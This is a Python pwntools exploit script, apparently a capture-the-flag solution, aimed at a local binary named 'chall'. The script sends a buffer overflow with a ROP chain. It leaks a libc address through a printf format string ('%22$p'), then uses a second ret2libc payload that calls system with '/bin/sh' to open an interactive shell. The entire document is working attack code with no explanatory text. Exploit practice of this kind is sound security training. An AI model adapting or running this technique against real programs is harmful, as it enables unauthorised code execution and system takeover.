#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = process(exe.path)

payload  = b"A"*128
payload += p64(0x404038)		# rbp = bss
payload += p64(exe.plt["gets"])*2	# gets twice 
payload += p64(0x40101a)                # ret
payload += p64(exe.plt["printf"])       # get leak via fmt
payload += p64(exe.symbols["main"])     # return to main

io.sendlineafter(b"our name:", payload)
io.sendline(b"A")
io.sendline(b"..%22$p")
libc.address = int(io.recvuntil(b"Please").split(b"..")[1].split(b"Please")[0], 16) - 0x228b

# pop rdi ; ret           rdi = ptr to /bin/sh
# system
io.sendline(b"A"*136 + p64(libc.address + 0xe775b) + p64(libc.address + 0x1a342f) + p64(libc.address + 0x30750))
io.interactive()
